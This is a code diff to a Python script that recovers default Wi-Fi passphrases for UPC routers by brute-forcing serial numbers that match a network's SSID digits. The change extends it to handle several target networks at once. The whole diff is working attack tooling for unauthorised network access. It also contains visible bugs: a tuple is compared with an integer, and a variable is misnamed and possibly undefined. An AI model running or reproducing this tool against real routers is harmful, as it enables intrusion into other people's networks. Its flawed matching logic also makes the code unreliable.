@@ -21,6 +21,7 @@ TODO: try and speed this up - key generation takes *minutes*
 '''
 
 import re
+import collections
 from hashlib import md5
 
 UPC_REGEX = re.compile("UPC(\d{7})")
@@ -81,15 +82,14 @@ def upc_generate_ssid(int_1, int_2, int_3, int_4, magic):
 
     return b - (((b * MAGIC2) >> 54) - (b >> 31)) * 10000000;
 
-def gen_upc_keys(target_int):
+def gen_upc_keys(*target_ints):
 
     '''Generate the serial and potential keys for a UPC int.
 
      target_int: an int containing the 7 UPC digits
     '''
 
-    serial = ""
-    phrases = []
+    results = collections.defaultdict(list)
     for int_1 in xrange(MAX0+1):
         for int_2 in xrange(MAX1+1):
             for int_3 in xrange(MAX2+1):
@@ -97,7 +97,13 @@ def gen_upc_keys(target_int):
                     test_24 = upc_generate_ssid(int_1, int_2, int_3, int_4, MAGIC_24GHZ)
                     test_5 = upc_generate_ssid(int_1, int_2, int_3, int_4, MAGIC_5GHZ)
 
-                    if test_5 == target_int or test_24 == target_int:
+                    if test_5 in target_ints or test_24 == target_ints:
+                        the_int = None
+                        if test_5 in target_ints:
+                            the_upc_int = test_5
+                        if test_24 in target_ints:
+                            the_upc_int = test_24
+
                         serial = "SAAP%d%02d%d%04d" % (int_1, int_2, int_3, int_4)
 
                         serial_hash = md5(serial)
@@ -112,7 +118,9 @@ def gen_upc_keys(target_int):
 
                         hash_list = []
                         for i in range(0, 16, 4):
-                            hashchunk = serial_hash_hex[16+i+2:16+i+4]+serial_hash_hex[16+i:16+i+2]
+                            hashchunk = serial_hash_hex[
+                                16+i+2:16+i+4] + serial_hash_hex[
+                                    16+i:16+i+2]
                             hash_list.append(int(hashchunk, 16))
 
                         w2 = mangle(hash_list)
@@ -120,8 +128,8 @@ def gen_upc_keys(target_int):
                         tmp_str = "%08X%08X" % (w1, w2)
                         tmp_hash = md5(tmp_str).hexdigest()
                         password = hash2pass(tmp_hash)
-                        phrases.append(password)
-    return serial, phrases
+                        results[the_upc_int].append(password)
+    return results
 
 if __name__ == "__main__":
 
